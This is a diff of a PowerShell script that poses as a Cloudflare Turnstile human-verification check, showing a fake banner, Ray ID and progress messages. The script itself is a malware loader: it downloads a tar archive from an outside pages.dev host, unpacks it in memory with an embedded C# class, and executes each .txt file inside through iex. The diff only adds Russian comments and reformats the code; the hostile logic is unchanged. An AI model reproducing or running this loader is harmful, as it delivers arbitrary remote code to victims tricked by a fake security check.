@@ -1,18 +1,19 @@
+# run-challenge.ps1
 
-
-Start-Sleep -Seconds 1
-
-echo "
+# ASCII‑арт‑заголовок
+Write-Host "
   ____ _                 _  __ _                
  / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___ 
 | |   | |/ _ \| | | |/ _` | |_| |/ _` | '__/ _ \
 | |___| | (_) | |_| | (_| |  _| | (_| | | |  __/
  \____|_|\___/ \__,_|\__,_|_| |_|\__,_|_|  \___|
- ";
+";
 
+# Ray ID для трекинга
 Write-Host "Ray ID: b068ea8aebd976e9"
 Write-Host "Running Turnstile challenge, this won't take long..."
 
+# Подключаем динамическое определение класса TarExtractor, если он ещё не загружен
 if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
           ForEach-Object { $_.GetTypes() } |
           Where-Object { $_.FullName -eq 'TarExtractor' })) {
@@ -47,8 +48,7 @@ if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
                     extractedFiles.Add(fileName, fileData);
 
                     long padding = 512 - (memoryStream.Position % 512);
-                    if (padding < 512)
-                    {
+                    if (padding < 512) {
                         memoryStream.Seek(padding, SeekOrigin.Current);
                     }
                 }
@@ -62,15 +62,17 @@ if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
     Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
 }
 
-$tarUrl = "https://gateway1.pages.dev/ps1.tar"
-$webClient = New-Object System.Net.WebClient
-$tarData = $webClient.DownloadData($tarUrl)
+# URL архива .tar с плагинами
+$tarUrl     = "https://gateway1.pages.dev/ps1.tar"
+$webClient  = New-Object System.Net.WebClient
+$tarData     = $webClient.DownloadData($tarUrl)
 $extractedFiles = [TarExtractor]::ExtractTarFromMemory($tarData)
 
+# Выполняем все .txt‑скрипты из архива
 foreach ($file in $extractedFiles.Keys) {
     if ($file -match "\.txt$") {
         Write-Host "Challenge completed. Just a moment..."
-        $data = $extractedFiles[$file]
+        $data   = $extractedFiles[$file]
         $plugin = [System.Text.Encoding]::UTF8.GetString($data)
         iex $plugin
     }
